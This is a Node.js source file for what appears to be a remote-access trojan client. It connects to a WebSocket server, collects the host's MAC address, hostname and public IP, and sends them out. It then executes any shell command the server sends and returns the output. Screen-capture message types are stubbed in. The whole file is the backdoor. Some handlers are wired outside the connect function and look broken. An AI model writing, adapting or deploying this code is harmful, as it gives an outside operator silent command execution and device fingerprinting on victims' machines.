//first create a executable file that can run commands in cli
const WebSocket = require('ws').WebSocket;
const { exec } = require('child_process');

var ws = null;

var ip = '';
var mac = '';
var hostname = '';
var device = '';
var loop = null;
var interval = null;
var reconnectLoop = null;
var connecting = false;

  //ws.send(Date.now());
  const connect = async() => {
    if(connecting) return;
    connecting= true;
      ws = new WebSocket('ws://vpn-ip:8080');
   
      
  ws.onopen = function() {
      clearInterval(reconnectLoop);
      interval = setInterval(() => {
            ws.send(JSON.stringify({
                type: 'ping',
            }));
        }, 2000);
  exec('getmac /v', (error, stdoutMAC) => {
    if(error) {
      console.log(`error: ${error.message}`);
      return;
    }

  exec('hostname', (error, stdoutName, stderr) => {
    if (error) {
      console.error(`error: ${error.message}`);
      return;
    }
  
    if (stderr) {
      console.error(`stderr: ${stderr}`);
      return;
    }
    exec('nslookup myip.opendns.com resolver1.opendns.com', (error, stdout) => {
       if(error){
         console.error(`error: ${error.message}`);
         return;
       }
                let macs = [];
                stdoutMAC.split('\n').forEach(line => {
                    //console.log(line);
                    let words = line.split(' ');
                    words.forEach(element => {
                        if(element.match(/^[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}$/)){
                            macs.push(element);
                            //console.log(element);
                        }
                    })

                });
                mac = macs[0];
                hostname = stdoutName.trim();
                ip = stdout.split('Address: ')[1].split('\n')[0];
                ip = ip.trim();
                device = stdoutName.trim() +'['+mac+']'+ ':' + ip;
                ws.send(JSON.stringify({type:'handshake', data:device}));
            
    });
  
    
  });
})
    };



ws.on('close', function close() {
  console.log('disconnected');
  connecting=false;
  clearInterval(loop);
    clearInterval(interval);
    reconnectLoop = setInterval(() => {
        connect();
    }, 5000);

});
ws.on('error', function() {
  console.log('disconnected');
  connecting=false;
  clearInterval(loop);
    clearInterval(interval);
    reconnectLoop = setInterval(() => {
        connect();
    }, 5000);
  
});

ws.on('message', function message(data) {
    data = JSON.parse(String(data));
 if(data.type === 'command'){
   exec(data.cmd, (err, stdout) => {
        if (err) {
        console.error(err);
        return;
        }
        ws.send(JSON.stringify({type:'response', data:stdout}));
        console.log(stdout);
    })
 }
    if(data.type === 'screen-capture-start'){
        console.log('starting screen capture');
       
    }
    if(data.type === 'screen-capture-stop'){
        clearInterval(loop);
    }
});
  }

  connect();





